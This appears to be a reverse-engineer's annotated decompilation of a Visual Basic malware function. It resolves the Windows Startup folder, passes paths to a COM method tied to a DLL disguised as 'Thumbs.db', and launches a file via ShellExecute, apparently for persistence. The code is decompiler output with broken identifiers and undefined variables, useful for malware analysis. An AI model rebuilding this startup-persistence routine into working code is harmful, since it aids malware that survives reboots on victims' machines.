Public Function funct0() '405960
  'Data Table: 401838
  Dim MemVar_407350 As Global
  Dim exe_path As Variant
  Dim startup_path As Variant

  loc_405782: On Error Resume Next ' Ignore errors
  
  ' Call the DLL
  loc_405793: memVar = MemVar_407350.App ' Arg 1
  loc_4057A3: exe_path = CVar(App.Path) 'String. Get the app path. Arg 2
  loc_4057A9: Thumbs   .db.address_80000210 ' Call to the DLL
  
  loc_4057B1: startup_path4 = startup_path 'Variant. startup_path hasnt been initialized yet
  loc_4057C3: exe_path = 0 ' Clear the variable
  loc_4057C8: startup_path = funct1(exe_path) ' get the Startup folder path

  ' This wont execute
  loc_4057D9: If (startup_path4 = startup_path) Then ' startup_path4 was defined with an unknown value
  loc_4057DE:   funct0 = startup_path ' Set startup_path as return code, but dont exit (?)
  loc_4057E4: End If

  ' Call to the DLL
  loc_4057EB: backslash = "\" 'Variant. Arg 1 (root path??)
  loc_4057FC: Thumbs   .db.address_8000026B

  loc_40580C: If CBool(exe_path <> backslash) Then
  loc_40581B:   startup_path4 = startup_path4 & backslash 'Variant. Unknown value + \
  loc_40581F: End If

  ' Call the DLL
  loc_40582D: memVar = MemVar_407350.App ' Arg 1
  loc_40583D: exe_path = CVar(App.EXEName) 'String. Get the EXE name. Arg 2
  loc_405843: Thumbs   .db.address_80000210

  ' Call the DLL
  loc_40584B: startup_path2 = startup_path 'Variant. Arg 1
  loc_40585F: exe_path = "Thumbs" ' Arg 2
  loc_405868: Thumbs   .db.address_80000210

  loc_405879: If (startup_path = startup_path) Then ' If (True) Then
                ' Call the DLL
                ' InStr([ start ], startup_path4, string2, [ compare ])
  loc_405890:   exe_path = InStr(1, startup_path4, ":", 0) ' Gets the position of the first ":". Arg 1
  loc_40589C:   Thumbs   .db.address_80000269
  loc_4058A4:   startup_path3 = startup_path 'Variant
  loc_4058AE: Else
                ' Call the DLL
  loc_4058C1:   startup_path = (Len(startup_path2) - 1) ' Arg 1
  loc_4058CD:   Thumbs   .db.address_80000269
  loc_4058D9:   startup_path3 = var_EC & var_EC 'Variant ' var_EC is not defined yet
  loc_4058E0: End If

  loc_4058E7: exe_path = funct2() ' Call funct2(), but the return value wont be used
              ' Call (to the given ProgID ? )
              ' [ Call ] procedureName [ (argumentList) ]
  loc_405905: Call {0D608C23-AE41-11DB-A47CB713666A9177}.Method_arg_58 (
                      var_130,       ' var_130 has not been initialized yet
                      startup_path2, ' Path to the startup folder
                      CLng(startup_path), ' (Len(startup_path2) - 1) -> Path lenght, begin counting from 0. Long type casting.
                      startup_path4, ' Path to the startup folder. "\" appended.
                      startup_path,  ' (Len(startup_path2) - 1) -> Path lenght, begin counting from 0. Integer type?
                      startup_path4, ' Path to the startup folder. "\" appended.
                      CLng(funct3(startup_path3)),
                      funct3(startup_path3)
                    )

              ' Shell.ShellExecute( _                ' Execute a shell command
              '   ByVal sFile As BSTR, _             ' Name of the executable
              '   [ ByVal vArguments As Variant ], _ ' Parameters for the executable
              '   [ ByVal vDirectory As Variant ], _ ' Path of the executable. Set to default if no value is given. Default is current dir.
              '   [ ByVal vOperation As Variant ], _ ' Operation to perform (what does this mean?)
              '   [ ByVal vShow As Variant ] _       ' Specify how to show the window (1 -> Open with a normal window)
              ' ) As Integer
  loc_40593E: ShellExecute(var_130, "open", CStr(startup_path3), vbNullString, vbNullString, 1)
  loc_405953: End
  loc_405957: funct0 = startup_path2 ' Return startup_path2 = startup_path
End Function